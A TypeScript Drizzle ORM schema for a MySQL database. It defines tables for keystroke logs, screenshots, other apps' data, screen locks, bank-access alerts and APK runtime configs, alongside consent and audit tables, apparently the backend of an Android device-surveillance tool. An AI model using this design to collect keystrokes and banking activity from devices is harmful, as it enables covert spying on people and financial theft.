import { mysqlTable, varchar, int, serial } from "drizzle-orm/mysql-core";

export const users = mysqlTable("users", {
  id: serial("id").primaryKey(),
  openId: varchar("openId", { length: 255 }).notNull(),
  name: varchar("name", { length: 255 }),
  email: varchar("email", { length: 255 }),
  loginMethod: varchar("loginMethod", { length: 255 }),
});

export const keylogs = mysqlTable("keylogs", {
  id: serial("id").primaryKey(),
  userId: int("userId").notNull(),
  key: varchar("key", { length: 255 }),
  createdAt: varchar("createdAt", { length: 255 }),
});

export const apkRuntimeConfigs = mysqlTable("apkRuntimeConfigs", {
  id: serial("id").primaryKey(),
  configKey: varchar("configKey", { length: 255 }).notNull(),
  configValue: varchar("configValue", { length: 255 }),
  updatedAt: varchar("updatedAt", { length: 255 }),
});

export const screenshots = mysqlTable("screenshots", {
  id: serial("id").primaryKey(),
  userId: int("userId").notNull(),
  imageUrl: varchar("imageUrl", { length: 255 }),
  createdAt: varchar("createdAt", { length: 255 }),
});

export const appsData = mysqlTable("appsData", {
  id: serial("id").primaryKey(),
  userId: int("userId").notNull(),
  appName: varchar("appName", { length: 255 }),
  data: varchar("data", { length: 255 }),
  createdAt: varchar("createdAt", { length: 255 }),
});

export const screenLocks = mysqlTable("screenLocks", {
  id: serial("id").primaryKey(),
  userId: int("userId").notNull(),
  locked: int("locked"),
  createdAt: varchar("createdAt", { length: 255 }),
});

export const bankAccessAlerts = mysqlTable("bankAccessAlerts", {
  id: serial("id").primaryKey(),
  userId: int("userId").notNull(),
  alertType: varchar("alertType", { length: 255 }),
  createdAt: varchar("createdAt", { length: 255 }),
});

export const lgpdConsents = mysqlTable("lgpdConsents", {
  id: serial("id").primaryKey(),
  userId: int("userId").notNull(),
  consentType: varchar("consentType", { length: 255 }),
  granted: int("granted"),
  createdAt: varchar("createdAt", { length: 255 }),
});

export const auditLogs = mysqlTable("auditLogs", {
  id: serial("id").primaryKey(),
  userId: int("userId").notNull(),
  action: varchar("action", { length: 255 }),
  createdAt: varchar("createdAt", { length: 255 }),
});

export const dataRetentionPolicies = mysqlTable("dataRetentionPolicies", {
  id: serial("id").primaryKey(),
  policyName: varchar("policyName", { length: 255 }),
  description: varchar("description", { length: 255 }),
  daysToRetain: int("daysToRetain"),
  createdAt: varchar("createdAt", { length: 255 }),
});